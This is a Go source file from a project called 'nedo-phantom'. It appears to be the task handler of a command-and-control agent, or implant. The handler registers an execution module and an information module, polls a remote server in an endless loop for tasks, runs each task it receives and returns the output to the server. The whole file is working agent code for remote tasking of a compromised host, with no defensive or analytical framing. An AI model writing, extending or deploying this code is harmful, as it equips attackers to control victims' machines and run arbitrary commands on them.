package tasks

import (
    "encoding/json"
    "fmt"
    "time"

    "nedo-phantom/internal/agent/modules"
    "nedo-phantom/internal/common"
)

type TaskHandler struct {
    conn          *common.SecureConn
    moduleManager *modules.ModuleManager
}

func NewTaskHandler(conn *common.SecureConn, mm *modules.ModuleManager) *TaskHandler {
    return &TaskHandler{
        conn:          conn,
        moduleManager: mm,
    }
}

func (h *TaskHandler) Run() {
    h.moduleManager.Register(&modules.ExecModule{})
    h.moduleManager.Register(&modules.InfoModule{})
    fmt.Printf("[+] Registered %d modules\n", h.moduleManager.Count())

    for {
        if err := h.requestTask(); err != nil {
            fmt.Printf("[-] Request error: %v\n", err)
            time.Sleep(5 * time.Second)
            continue
        }

        msg, err := h.readMessage()
        if err != nil {
            fmt.Printf("[-] Read error: %v\n", err)
            time.Sleep(5 * time.Second)
            continue
        }

        if msg.Type == "no_task" {
            time.Sleep(5 * time.Second)
            continue
        }

        if msg.Type == "task" {
            fmt.Printf("[+] Executing task %s (%s)\n", msg.Task.ID, msg.Task.Type)
            result := h.executeTask(msg.Task)
            if err := h.sendResult(result); err != nil {
                fmt.Printf("[-] Send error: %v\n", err)
            }
        }
    }
}

func (h *TaskHandler) requestTask() error {
    msg := common.Message{Type: "get_task"}
    data, err := json.Marshal(msg)
    if err != nil {
        return err
    }
    _, err = h.conn.Write(data)
    return err
}

func (h *TaskHandler) readMessage() (*common.Message, error) {
    buf := make([]byte, 4096)
    n, err := h.conn.Read(buf)
    if err != nil {
        return nil, err
    }
    var msg common.Message
    if err := json.Unmarshal(buf[:n], &msg); err != nil {
        return nil, err
    }
    return &msg, nil
}

func (h *TaskHandler) executeTask(task *common.Task) *common.TaskResult {
    var data []byte
    switch v := task.Data.(type) {
    case string:
        data = []byte(v)
    case []byte:
        data = v
    case nil:
        data = []byte{}
    default:
        return &common.TaskResult{
            TaskID: task.ID,
            Error:  "unsupported data type",
        }
    }

    output, err := h.moduleManager.Execute(task.Type, data)
    if err != nil {
        return &common.TaskResult{
            TaskID: task.ID,
            Error:  err.Error(),
        }
    }

    return &common.TaskResult{
        TaskID: task.ID,
        Output: string(output),
    }
}

func (h *TaskHandler) sendResult(result *common.TaskResult) error {
    msg := common.Message{
        Type:   "result",
        Result: result,
    }
    data, err := json.Marshal(msg)
    if err != nil {
        return err
    }
    _, err = h.conn.Write(data)
    return err
}
